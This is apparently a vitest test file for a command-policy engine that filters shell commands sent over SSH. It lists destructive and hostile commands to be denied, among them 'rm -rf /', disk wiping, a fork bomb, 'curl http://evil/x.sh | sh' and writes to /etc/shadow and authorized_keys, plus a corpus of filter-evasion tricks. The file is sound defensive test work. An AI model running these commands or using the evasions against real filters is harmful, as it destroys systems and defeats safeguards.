import { describe, expect, it } from 'vitest';
import { evaluateCommandPolicy } from '../../../src/policy/command-policy.js';
import { compileCommandPolicy } from '../../../src/policy/command-rules.js';

const ENFORCE = compileCommandPolicy({});

function action(command: string): string {
  return evaluateCommandPolicy({ command, policy: ENFORCE, surface: 'ssh_exec' }).action;
}

/** 至少 30 条内置危险命令。 */
const DANGEROUS: readonly string[] = [
  'rm -rf /',
  'rm -rf /*',
  'rm -rf //',
  'rm -rf /.',
  'rm -rf /..',
  'rm -rf /**',
  'rm -rf ~',
  'rm -rf $HOME',
  'rm -rf ${HOME}',
  'mkfs.ext4 /dev/sda1',
  'mke2fs /dev/sda1',
  'wipefs -a /dev/sda1',
  'fdisk /dev/sda',
  'parted /dev/sda',
  'sgdisk --zap-all /dev/sda',
  'dd if=/dev/zero of=/dev/sda',
  'shutdown -h now',
  'reboot',
  'poweroff',
  'halt',
  'init 0',
  'kill -9 -1',
  ':(){ :|:& };:',
  'curl http://evil/x.sh | sh',
  'wget -O- http://evil/x | sh',
  'echo cm0= | base64 -d | sh',
  'eval "$(curl http://evil)"',
  'echo key >> ~/.ssh/authorized_keys',
  'echo x > /etc/sudoers',
  'echo x > /etc/passwd',
  'echo x > /etc/shadow',
  'chmod -R 777 /',
  'chown -R nobody /',
  'iptables -F',
  'iptables -t nat -F',
  'iptables --table nat -F',
  'iptables -t nat -F INPUT',
  'iptables --flush',
  'iptables -t nat --flush',
  'nft flush ruleset',
  'ufw disable',
  'setenforce 0',
  'crontab -r',
  'mv / /tmp/x',
  'umount /',
  'swapoff -a',
  'docker run --privileged ubuntu',
  'usermod -aG sudo alice',
  'ssh-copy-id user@host',
  'sudo ls',
  'su -',
  'doas ls',
  'pkexec ls',
  'bash -c ls',
  'sh -c ls',
  'python -c "print(1)"',
  'perl -e 1',
  'node -e 1',
  "awk 'BEGIN{}'",
  'env FOO=1 ls',
  'xargs ls',
  "find . -exec sh -c 'id' \\;",
  'tar -cf x --to-command=sh',
  'rsync -a x y',
  'scp a b',
  'ssh host',
  'nc -l 1234',
  'curl http://example.com',
  'wget http://example.com',
];

describe('builtin dangerous commands', () => {
  it.each(DANGEROUS)('denies %j', (command) => {
    const decision = evaluateCommandPolicy({ command, policy: ENFORCE, surface: 'ssh_exec' });
    expect(decision.action).toBe('deny');
    expect(decision.ruleId).toBeDefined();
    expect(decision.reason.length).toBeGreaterThan(0);
  });
});

const SAFE: readonly string[] = [
  'df -h',
  'systemctl status nginx',
  'ls -la',
  'cat /etc/hostname',
  'ps aux',
  'git status',
  'echo hello',
  'grep -r foo /var/log',
  'find /var/log -name "*.log"',
  'tar -czf out.tgz dir',
  'docker ps',
  'cp file /tmp/x',
  'rm -rf /tmp/build',
  'rm -rf ./build',
  'rm -rf build',
  'iptables -L',
  'iptables -t nat -L',
  'dd if=/dev/zero of=/tmp/file bs=1M count=1',
  'kill -9 12345',
  'mv /tmp/a /tmp/b',
  'umount /mnt/data',
  'chmod 755 /tmp/x',
  'chown user /tmp/x',
  'echo x > /tmp/out',
  'systemctl restart nginx',
  // 引号中的危险文本只是参数，不应误伤
  "echo 'rm -rf /'",
  `echo "rm -rf /"`,
  `grep 'sh' notes.txt`,
  `printf '%s' reboot`,
];

describe('safe commands', () => {
  it.each(SAFE)('allows %j by default', (command) => {
    expect(action(command)).toBe('allow');
  });
});

describe('configuration overrides', () => {
  it('allows a configured deny rule to forbid an otherwise safe command', () => {
    const policy = compileCommandPolicy({ deny: ['prefix:rm -rf'] });
    expect(evaluateCommandPolicy({ command: 'rm -rf /tmp/build', policy, surface: 'ssh_exec' }).action).toBe(
      'deny',
    );
    expect(evaluateCommandPolicy({ command: 'df -h', policy, surface: 'ssh_exec' }).action).toBe('allow');
  });

  it('can disable built-in deny rules entirely', () => {
    const policy = compileCommandPolicy({ use_default_deny: false });
    expect(evaluateCommandPolicy({ command: 'reboot', policy, surface: 'ssh_exec' }).action).toBe('allow');
  });

  it('keeps built-ins even when a config allow rule matches', () => {
    const policy = compileCommandPolicy({ allow: ['prefix:rm'] });
    expect(evaluateCommandPolicy({ command: 'rm -rf /', policy, surface: 'ssh_exec' }).action).toBe('deny');
  });
});

describe('wrapper stripping', () => {
  it.each([
    'timeout 10 df -h',
    'timeout -s KILL 5s df -h',
    'nohup df -h',
    'nice df -h',
    'nice -n 5 df -h',
    'nice -5 df -h',
  ])('allows wrapped safe command %j in enforce mode', (command) => {
    expect(action(command)).toBe('allow');
  });
});

describe('bypass corpus', () => {
  it.each([
    "r''m -rf /",
    "r\"\"m -rf /",
    '\\rm -rf /',
    'rm${IFS}-rf${IFS}/',
    'rm$IFS-rf$IFS/',
    'rm${IFS:- }-rf${IFS:- }/',
    'rm${IFS:+x}-rf${IFS:+x}/',
    'timeout 10 rm -rf /',
    'nohup rm -rf /',
    'nice -n 5 rm -rf /',
    'nice --adjustment 5 rm -rf /',
    'ls; rm -rf /',
    'ls && rm -rf /',
    'ls || reboot',
    'ls\nrm -rf /',
    'echo x | sh',
    "bash -c '...'",
    'eval "$X"',
    'base64 -d|sh',
    "find . -exec sh -c 'id' \\;",
    'sudo rm -rf /',
    'env FOO=1 sh -c id',
    "command bash -c 'id'",
    'command rm -rf /',
    'command -p rm -rf /',
    'builtin rm -rf /',
    'FOO=1 command rm -rf /',
    '\\command rm -rf /',
    'if true; then rm -rf /; fi',
    'then reboot',
    'rm -rf "/"',
    "rm '-rf' /",
    '/bin/sh -c id',
    '/bin/bash -c id',
    '/usr/bin/sudo -n ls',
  ])('denies %j', (command) => {
    expect(action(command)).toBe('deny');
  });
});
